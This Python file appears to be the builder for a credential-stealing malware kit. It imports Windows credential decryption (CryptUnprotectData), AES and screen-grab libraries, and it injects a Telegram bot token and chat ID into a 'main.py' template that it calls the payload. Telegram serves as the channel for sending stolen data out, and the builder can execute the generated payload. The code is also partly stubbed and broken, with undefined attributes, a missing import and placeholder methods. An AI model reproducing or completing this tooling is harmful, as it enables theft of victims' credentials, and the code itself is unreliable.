import os
import random
import shutil
import subprocess
import sys
import time
import threading
import re
import json
import requests
import ntpath
import base64
import ctypes
import psutil
import httpx
from datetime import datetime, timedelta, timezone
from json import loads
from urllib.request import Request, urlopen
from shutil import copy2
from tempfile import gettempdir, mkdtemp
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from Crypto.Cipher import AES
from PIL import ImageGrab
from win32crypt import CryptUnprotectData
from sys import argv

# -------------------- START: Prompt for Telegram credentials --------------------
# Remove webhook URL prompt, add Telegram bot token and chat id
print("=== Telegram Notification Setup ===")
TELEGRAM_BOT_TOKEN = input("Enter your Telegram Bot Token: ").strip()
TELEGRAM_CHAT_ID = input("Enter your Telegram Chat ID: ").strip()

# Validate token
def check_bot_token(token):
    url = f"https://api.telegram.org/bot{token}/getMe"
    try:
        r = requests.get(url)
        return r.status_code == 200
    except:
        return False

if not check_bot_token(TELEGRAM_BOT_TOKEN):
    print("Invalid Telegram Bot Token. Exiting.")
    sys.exit()

# Function to send Telegram message
def send_telegram_message(text):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    data = {"chat_id": TELEGRAM_CHAT_ID, "text": text, "parse_mode": "Markdown"}
    try:
        requests.post(url, data=data)
    except:
        pass
# -------------------- END: Telegram setup --------------------

# Rest of your script starts here, replace webhook references with Telegram

class Functions(object):
    # Your existing functions...
    pass

class Builder:
    def __init__(self):
        # Your existing init code...

        # Remove webhook prompt, insert Telegram credentials into payload generator
        self.mk_file(self.filename, TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID)

        print(f"{Fore.GREEN}[+]{Fore.RESET} File successfully created!")

        self.cleanup(self.filename)
        self.renamefile(self.filename)

        # After build completion, send Telegram notification
        self.send_telegram_message("Build completed successfully!")

        input(f"{Fore.GREEN}[+]{Fore.RESET} Press Enter to exit...")
        sys.exit()

    def check_bot_token(self, token):
        url = f"https://api.telegram.org/bot{token}/getMe"
        try:
            r = requests.get(url)
            return r.status_code == 200
        except:
            return False

    def send_telegram_message(self, message):
        url = f"https://api.telegram.org/bot{self.bot_token}/sendMessage"
        data = {"chat_id": self.chat_id, "text": message, "parse_mode": "Markdown"}
        try:
            requests.post(url, data=data)
        except:
            pass

    def check(self):
        # Your existing check method...
        pass

    def mk_file(self, filename, bot_token, chat_id):
        print(f"{Fore.GREEN}[+]{Fore.RESET} Generating source code with Telegram credentials...")

        # Read your main.py template
        with open("./main.py", "r", encoding="utf-8") as f:
            code = f.read()

        # Replace placeholders with your Telegram credentials
        code = code.replace("%BOT_TOKEN%", bot_token).replace("%CHAT_ID%", chat_id)

        # Write the final payload script
        with open(f"{filename}.py", "w", encoding="utf-8") as f:
            f.write(code)

        print(f"{Fore.GREEN}[+]{Fore.RESET} Payload code generated with Telegram credentials.")

    def run(self, filename):
        print(f"{Fore.GREEN}[+]{Fore.RESET} Attempting to execute the payload...")
        if os.path.isfile(f"./{filename}.exe"):
            os.system(f"start ./{filename}.exe")
        elif os.path.isfile(f"./{filename}.py"):
            os.system(f"python ./{filename}.py")

    def cleanup(self, filename):
        # Your existing cleanup logic...
        pass

    def renamefile(self, filename):
        # Your existing rename logic...
        pass

# Main execution
if __name__ == "__main__":
    from colorama import init
    init()

    if os.name != "nt":
        os.system("clear")
    else:
        os.system("mode con:cols=212 lines=212")
        os.system("cls")

    Builder()
